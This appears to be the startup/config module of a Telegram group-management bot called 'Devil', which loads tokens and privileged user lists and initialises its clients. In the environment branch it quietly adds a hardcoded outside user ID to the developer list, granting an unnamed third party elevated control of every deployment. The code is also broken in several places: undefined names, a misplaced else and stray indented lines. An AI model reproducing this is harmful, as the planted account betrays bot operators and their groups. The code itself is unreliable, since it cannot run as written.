import logging, os, sys, time
import telegram.ext as tg
from telethon.sessions import MemorySession
from telethon import TelegramClient
from Python_ARQ import ARQ
import aiohttp
from aiohttp import ClientSession

StartTime = time.time()


# enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("log.txt"), logging.StreamHandler()],
    level=logging.INFO,
)

LOGGER = logging.getLogger(__name__)


# if version < 3.6, stop bot.
if sys.version_info[0] < 3 or sys.version_info[1] < 6:
    LOGGER.error(
        "You must have a python version of at least 3.6! Multiple features depend on this. Bot quitting."
    )
    quit(1)

ENV = bool(os.environ.get("ENV", False))

if ENV:
    TOKEN = os.environ.get("TOKEN", None)

    try:
        OWNER_ID = int(os.environ.get("OWNER_ID", None))
    except ValueError:
        raise Exception("Your OWNER_ID env variable is not a valid integer.")
    try:
        INSPECTOR = {int(x) for x in os.environ.get("INSPECTOR", "").split()}
        DEV_USERS = {int(x) for x in os.environ.get("DEV_USERS", "").split()}
    except ValueError:
        raise Exception("Your inspector(sudo) or dev users list does not contain valid integers.")

    try:
        ENFORCER = {int(x) for x in os.environ.get("ENFORCER", "").split()}
    except ValueError:
        raise Exception("Your enforcer list does not contain valid integers.")
    try:
        API_ID = int(os.environ.get("API_ID", None))
    except ValueError:
        raise Exception("Your API_ID env variable is not a valid integer.")

    try:
        API_HASH = os.environ.get("API_HASH", None)
    except ValueError:
        raise Exception("Please Add Hash Api key to start the bot")

    DB_URI = os.environ.get("DATABASE_URL")
    PHOTO = os.environ.get("PHOTO")
    WORKERS = int(os.environ.get("WORKERS", 8))
    ALLOW_EXCL = os.environ.get('ALLOW_EXCL', False)
    ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)

    OWNER_USERNAME = os.environ.get("OWNER_USERNAME", None)
    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", None)
    EVENT_LOGS = os.environ.get("EVENT_LOGS", None)
    JOIN_LOGGER = os.environ.get("JOIN_LOGGER", None)

    WEBHOOK = bool(os.environ.get("WEBHOOK", False))
    CERT_PATH = os.environ.get("CERT_PATH")
    URL = os.environ.get("URL", "")  # Does not contain token
    PORT = int(os.environ.get("PORT", 5000))

    LOAD = os.environ.get("LOAD", "").split()
    NO_LOAD = os.environ.get("NO_LOAD", "translation").split()

    DEL_CMDS = bool(os.environ.get("DEL_CMDS", True))
    INFOPIC = bool(os.environ.get("INFOPIC", True))

SUDO_USERS.add(OWNER_ID)
DEV_USERS.add(OWNER_ID)
DEV_USERS.add(2070119160)




else:
    from Devil.config import Development as Config

    try:
        OWNER_ID = int(Config.OWNER_ID)
    except ValueError:
        raise Exception("Your OWNER_ID variable is not a valid integer.")
# telegram bot requered things from telegram org 
    API_ID = Config.API_ID
    API_HASH = Config.API_HASH
    TOKEN = Config.TOKEN
    DB_URI = Config.SQLALCHEMY_DATABASE_URI

    SUPPORT_CHAT = Config.SUPPORT_CHAT

#install aiohttp session
print("[INFO]: INITIALZING AIOHTTP SESSION")
aiohttpsession = ClientSession()

# ARQ Client
print("[INFO]: INITIALIZING ARQ CLIENT")
ARQ_API_KEY = "Arq Api"
ARQ_API_URL = "https://arq.hamker.in"
arq = ARQ(ARQ_API_URL, ARQ_API_KEY, aiohttpsession)
loop = asyncio.get_event_loop()

# WEBHOOK REQUERED THINGS
    WORKERS = Config.WORKERS
    ALLOW_EXCL = Config.ALLOW_EXCL
    WEBHOOK = Config.WEBHOOK
    CERT_PATH = Config.CERT_PATH
    PORT = Config.PORT
    URL = Config.URL


updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
telethn = TelegramClient(MemorySession(), API_ID, API_HASH)
dispatcher = updater.dispatcher





async def get_entity(client, entity):
    entity_client = client
    if not isinstance(entity, Chat):
        try:
            entity = int(entity)
        except ValueError:
            pass
        except TypeError:
            entity = entity.id
        try:
            entity = await client.get_chat(entity)
        except (PeerIdInvalid, ChannelInvalid):
            for kp in apps:
                if kp != client:
                    try:
                        entity = await kp.get_chat(entity)
                    except (PeerIdInvalid, ChannelInvalid):
                        pass
                    else:
                        entity_client = kp
                        break
            else:
                entity = await kp.get_chat(entity)
                entity_client = kp
    return entity, entity_client


async def eor(msg: Message, **kwargs):
    func = msg.edit_text if msg.from_user.is_self else msg.reply
    spec = getfullargspec(func.__wrapped__).args
    return await func(**{k: v for k, v in kwargs.items() if k in spec})


INSPECTOR = list(INSPECTOR) + list(DEV_USERS)
DEV_USERS = list(DEV_USERS)
ENFORCER = list(ENFORCER)


# Load at end to ensure all prev variables have been set
from Devil.Handlers.handlers import (
    CustomCommandHandler,
    CustomMessageHandler,
    CustomRegexHandler,
)

# make sure the regex handler can take extra kwargs
tg.RegexHandler = CustomRegexHandler
tg.CommandHandler = CustomCommandHandler
tg.MessageHandler = CustomMessageHandler
